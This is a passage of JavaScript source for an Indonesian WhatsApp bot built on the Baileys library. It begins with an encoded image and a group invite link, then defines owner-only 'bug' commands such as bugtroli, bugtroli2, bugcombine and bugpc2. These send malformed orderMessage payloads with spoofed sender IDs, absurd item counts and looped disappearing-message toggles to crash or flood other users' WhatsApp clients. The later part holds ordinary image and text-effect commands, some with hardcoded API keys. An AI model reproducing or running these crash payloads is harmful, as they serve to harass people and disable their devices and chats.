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",
"caption": "https://chat.whatsapp.com/GY74IwuwLlFELw97ByRk79",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ftroli, contextInfo:{}})
Hisnu.relayWAMessage(res)
await setTimeout(() => {
reply('Hacker ( KunzxD ~ 404 )')
}, 3000)
break

case 'bugtroli':
if (!mek.key.fromMe && !isOwner) return
function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
Hisnu.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: fakeimage,
    itemCount: -96976930347493737473837382920202049, // Bug
    status: 1,
    surface: 1,
    message: '☠️𝑫𝑬𝑽𝑰𝑳☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
Hisnu.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'bugtroli2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`
		        var grousp = await Hisnu.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        Hisnu.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281333603591@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`,
						"orderTitle": `${fake}`,
						"sellerJid": "6281333603591@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        Hisnu.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281333603591@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`,
						"orderTitle": `${fake}`,
						"sellerJid": "6281333603591@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'bugvn':
if (!mek.key.fromMe && !isOwner) return
tapib1 = fs.readFileSync('./mp3/sound23.mp3')
Hisnu.sendMessage(from, tapib1, document, { quoted: mek, filename:`KunzxD ~ 404 ${vipi}.mp3`, mimetype: 'audio/application' })
await reply('Bang mau nanya')
break

case 'bugcombine':
if (!mek.key.fromMe && !isOwner) return
Hisnu.toggleDisappearingMessages(from, 'HACKED')
Hisnu.sendMessage(from, `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`,
    orderTitle: `Hisnu`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    Hisnu.updatePresence(from, Presence.composing)
	    sendMess(`dahlah`)
	    }, 2000)
	    reply(`dahlah`)
break

case 'buglokasi':
if (!mek.key.fromMe && !isOwner) return
Hisnu.updatePresence(from, Presence.composing)
		       Hisnu.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `Hisnu`,
						address: `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`,
                        jpegThumbnail: fakeimage },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `Hisnu`,
    orderTitle: `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break

case 'bugpc':
if (!mek.key.fromMe && !isOwner) return
Hisnu.updatePresence(from, Presence.composing)
Hisnu.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`,
    orderTitle: `Hisnu`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break

case 'bugpc2':
if (!mek.key.fromMe && !isOwner) return
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
Hisnu.sendMessage(from, `𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `Hisnu`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break

case 'bug3':
if (!mek.key.fromMe && !isOwner) return
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
await Hisnu.toggleDisappearingMessages(from, 0)
}
break
//ON & OFF BY MYMANS

      case 'on':
              if (!mek.key.fromMe && !isOwner) return 
              offline = false
              fakestatus(' ```ANDA TELAH ONLINE``` ')
              break
     case 'off':
              if (!mek.key.fromMe && !isOwner) return 
              offline = true
              waktu = Date.now()
              anuu = args.join(' ') ? args.join(' ') : '-'
              alasan = anuu
              fakestatus(' ```ANDA TELAH OFFLINE``` ')
              break
//FITUR BARU NYA MARCEL
    case 'trigger':
    case 'wanted':
    case 'wasted':
    case 'blur':
    case 'trash':
    case 'circle':
              if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
              ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
              reply(mess.wait)
              owgi = await Hisnu.downloadMediaMessage(ger)
              anu = await upload(owgi)           
              titid = await getBuffer(`https://xdev-api.herokuapp.com/canvas/${command}?url=${anu}`)               
              Hisnu.sendMessage(from, titid, image, {quoted : ftroli, caption: '_Success_'}) 
              } else {
              reply('_Fotonya mana kak?_')
}
              break
//<========[ 𝙏𝙀𝙓𝙏𝙋𝙍𝙊𝙈𝙀 ]=======>
   case "blackpink":
   case "neon":
   case "greenneon":
   case "advanceglow":
   case "futureneon":
   case "sandwriting":
   case "sandsummer":
   case "sandengraved":
   case "metaldark":
   case "neonlight":
   case "holographic":
   case "text1917":
   case "minion":
   case "deluxesilver":
   case "newyearcard":
   case "bloodfrosted":
   case "halloween":
   case "jokerlogo":
   case "fireworksparkle":
   case "natureleaves":
   case "bokeh":
   case "toxic":
   case "strawberry":
   case "box3d":
   case "roadwarning":
   case "breakwall":
   case "icecold":
   case "luxury":
   case "cloud":
   case "summersand":
   case "horrorblood":
   case "thunder":
              if (args.length == 0) return reply(`Example: ${prefix + command} text`)
              kipass = args.join(" ")
              kontolmu = await getBuffer(`http://api.lolhuman.xyz/api/textprome/${command}?apikey=AurelCans&text=${kipass}`)
              Hisnu.sendMessage(from, kontolmu, image, { quoted: mek})
              break
//<========[ 𝙀𝙋𝙃𝙊𝙏𝙊 𝟯𝟲𝟬 ]=======>
   case "wetglass":
   case "multicolor3d":
   case "watercolor":
   case "luxurygold":
   case "galaxywallpaper":
   case "lighttext":
   case "beautifulflower":
   case "puppycute":
   case "royaltext":
   case "heartshaped":
   case "birthdaycake":
   case "galaxystyle":
   case "hologram3d":
   case "greenneon":
   case "glossychrome":
   case "greenbush":
   case "metallogo":
   case "noeltext":
   case "glittergold":
   case "textcake":
   case "starsnight":
   case "wooden3d":
   case "textbyname":
   case "writegalacy":
   case "galaxybat":    
   case "snow3d":
   case "birthdayday":
   case "freefire":
              if (args.length == 0) return reply(`Example: ${prefix + command} text`)
              ini_txt = args.join(" ")
              ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${setting.lolkey}&text=${ini_txt}`)
              Hisnu.sendMessage(from, ini_buffer, image, { quoted: mek})
              break
//<========[ 𝙋𝙃𝙊𝙏𝙊 𝙊𝙓𝙔 ]=======>
    case "shadow":
    case "cup":
    case "cup1":
    case "romance":
    case "smoke":
    case "burnpaper":
    case "lovemessage":
    case "undergrass":
    case "love":
    case "coffe":
    case "woodheart":
    case "woodenboard":
    case "summer3d":
    case "wolfmetal":
    case "nature3d":
    case "underwater":
    case "golderrose":
    case "summernature":
    case "letterleaves":
    case "glowingneon":
    case "fallleaves":
    case "flamming":
    case "harrypotter":
    case "carvedwood":
               if (args.length == 0) return reply(`Example: ${prefix + command} text`)
               lemari = args.join(" ")
               ndasmu = await getBuffer(`http://api.lolhuman.xyz/api/photooxy1/${command}?apikey=AurelCans&text=${lemari}`)
               Hisnu.sendMessage(from, ndasmu, image, { quoted: mek})
               break
    case 'tts':
				if (args.length < 1) return Hisnu.sendMessage(from, 'Diperlukan kode bahasa kak!!', text, {quoted: mek})
					const gtts = require('./lib/gtts.js')(args[0])
					if (args.length < 2) return Hisnu.sendMessage(from, 'Mana teks yang mau di jadiin suara? suara setan kah?', text, {quoted: mek})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 500
					? reply('Textnya kebanyakan setan!! 😤')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buffer = fs.readFileSync(rano)
							if (err) return reply(ind.stikga())
							Hisnu.sendMessage(from, buffer, audio, {quoted: ftroli, ptt:true})
							fs.unlinkSync(rano)
						})
					})
					//await limitAdd(sender)
					break
     case 'panda':  
             anu = await fetchJson(`https://some-random-api.ml/img/panda`)
             anu1 = await getBuffer(anu.link)
             Hisnu.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
             break
     case 'panda1':  	
              anu = await fetchJson(`https://some-random-api.ml/img/red_panda`)
              anu1 = await getBuffer(anu.link)
              Hisnu.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
              break
     case 'bird':  	
              anu = await fetchJson(`https://some-random-api.ml/img/birb`)
              anu1 = await getBuffer(anu.link)
              Hisnu.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
              break
     case 'koala':  	
              anu = await fetchJson(`https://some-random-api.ml/img/koala`)
              anu1 = await getBuffer(anu.link)
              Hisnu.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
              break
    case 'amongus':
              if (!isPremium) return reply('[⏳] Kamu bukan user premium, kirim perintah !buypremium untuk membeli premium')
              if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} text`)      
              buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/amongus?apikey=${setting.lolkey}&text=${body.slice(9)}`)
              Hisnu.sendMessage(from, buffer, sticker, { quoted: mek })
              break
   case 'darkjokes': 
              reply(mess.wait)
              anu = await fetchJson(`https://api.zeks.me/api/darkjokes?apikey=Alphabott`)
              anu1 = await getBuffer(anu.result)
              Hisnu.sendMessage(from, anu1, image, {caption: `OK it's done`, quoted: ftroli})
              break
    case 'ytgold':  
              if (args.length < 1) return reply(`*${prefix}${command} Hisnu*`)
              F = body.slice(8)
              reply(mess.wait)
              anu = await getBuffer(`https://api.zeks.me/api/gplaybutton?text=${F}&apikey=Alphabott`)
              Hisnu.sendMessage(from, anu, image, {caption: `OK it's Done`, quoted: ftroli})
              break
   case 'ytsilver':  
              if (args.length < 1) return reply(`*${prefix}${command} Hisnu*`)
              F = body.slice(10)
              reply(mess.wait)
              anu = await getBuffer(`https://api.zeks.me/api/splaybutton?text=${F}&apikey=Alphabott`)
              Hisnu.sendMessage(from, anu, image, {caption: `OK it's Done`, quoted: ftroli})
              break
  case 'logoa':  
              if (args.length < 1) return reply(`*${prefix}${command} WAKK&BOTZ*`)
              var F = body.slice(7)
	          var F1 = F.split("&")[0];
	          var F2 = F.split("&")[1]; 
              reply(mess.wait)
              anu = await getBuffer(`https://api.zeks.me/api/logoaveng?text1=${F1}&text2=${F2}&apikey=Alphabott`)
              Hisnu.sendMessage(from, anu, image, {caption: `OK it's done`, quoted: ftroli})
              break
  case 'pornhub':  	
              if (args.length < 1) return reply(`*${prefix}${command} WAKK&BOTZ*`)
              var F = body.slice(9)
			  var F1 = F.split("&")[0];
	          var F2 = F.split("&")[1]; 
              reply(mess.wait)
              anu = await getBuffer(`https://api.zeks.me/api/phlogo?text1=${F1}&text2=${F2}&apikey=Alphabott`)
              Hisnu.sendMessage(from, anu, image, {caption: `OK it's done`, quoted: ftroli})
              break
   case 'marvel':  	
              if (args.length < 1) return reply(`*${prefix}${command} WAKK&BOTZ*`)
              var F = body.slice(8)
		      var F1 = F.split("&")[0];
			  var F2 = F.split("&")[1]; 
              reply(mess.wait)
              anu = await getBuffer(`https://api.zeks.me/api/marvellogo?text1=${F1}&text2=${F2}&apikey=Alphabott`)
              Hisnu.sendMessage(from, anu, image, {caption: `OK it's Done`, quoted: ftroli})
              break
   case 'tahta':  	
              if (args.length < 1) return reply(`*${prefix}${command} Hisnu*`)
              F = body.slice(7)
              reply(mess.wait)
              anu = await getBuffer(`https://api.zeks.me/api/hartatahta?text=${F}&apikey=Alphabott`)
              Hisnu.sendMessage(from, anu, image, {caption: `OK it's done`, quoted: ftroli})
              break
   case 'wall':  
             if (args.length < 1) return reply(`*${prefix}${command} Hisnu*`)
             F = body.slice(6)
             reply(mess.wait)
